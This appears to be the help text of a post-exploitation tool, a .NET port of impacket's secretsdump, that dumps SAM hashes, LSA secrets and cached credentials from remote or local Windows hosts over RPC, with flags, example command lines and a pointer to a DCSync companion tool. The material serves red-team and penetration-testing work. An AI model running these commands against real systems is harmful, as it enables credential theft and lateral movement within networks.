ABOUT
    .NET port of impacket secretsdump.py remote SAM and LSA Secrets dumping.
    Dumps local SAM and cached credentials from remote or local systems via RPC.

USAGE:
    net-sharp-sec-dump --- -target=<hosts> [options]

REQUIRED:
    -target          Comma separated list of IPs or hostnames (use 127.0.0.1 for local)

OPTIONAL:
    -u               Username for alternate credentials
    -p               Password for alternate credentials
    -d               Domain for alternate credentials (. for local)
    -threads         Concurrent enumeration threads (default: 10)

EXAMPLES:
    net-sharp-sec-dump --- -target=192.168.1.15
    net-sharp-sec-dump --- -target=192.168.1.10,192.168.1.11 -u=admin -p=Password123 -d=corp.local
    net-sharp-sec-dump --- -target=127.0.0.1

NOTES:
    Local dump requires high integrity context. Does not support NTDS.dit/DCSync.
    For DCSync use net-sharp-katz.
